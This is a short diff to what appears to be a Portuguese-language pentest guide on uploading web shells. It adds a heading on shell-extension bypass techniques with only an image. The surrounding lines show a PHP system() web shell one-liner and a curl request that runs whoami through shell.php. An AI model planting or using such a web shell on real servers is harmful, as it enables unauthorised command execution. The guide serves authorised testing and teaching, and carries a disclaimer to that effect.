@@ -70,6 +70,11 @@ Se fosse um Linux executando Apache por exemplo seria `echo '<?php system($_REQU
 curl "http://example.com/shell.php?cmd=whoami"
 
 ---
+Tecnicas de bypass de extensão shell
+<img width="542" height="848" alt="image" src="https://github.com/user-attachments/assets/af956b20-0722-46e8-9d86-e8e386792023" />
 
+
+
+---
 
 > ⚠️ **Aviso legal:** Todos os comandos aqui têm propósito educacional e devem ser utilizados somente em ambientes controlados ou com permissão explícita.
